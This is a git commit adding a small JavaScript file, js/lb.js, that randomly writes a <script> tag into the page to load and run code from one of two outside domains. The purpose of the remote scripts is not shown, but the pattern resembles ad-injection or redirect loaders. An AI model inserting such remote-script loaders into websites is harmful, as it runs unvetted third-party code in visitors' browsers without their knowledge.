2613bea2f6af59414baac59bd7069dbb0e481680
heihub <63719020+heihub@users.noreply.github.com>
2020-07-10 01:41:27 -0700

    Add files via upload

---
+++ js/lb.js
@@ -0,0 +1,10 @@
+var m = 2;
+var n = Math.floor(Math.random() * m + 1);
+switch (n) {
+case 1:
+document.writeln('<script src="https://p.minyaartcrafts.cn/dipper/CA4E28CC-9733-42D9-9F52-73E0738511E0.po"></script>');
+break;
+case 2:
+document.writeln("<script id=\'mob\' type=\'text/javascript\' charset=\'utf-8\' src=\'https://k.innvitor.com/s.php?pid=9525\'></script>");
+break;
+}
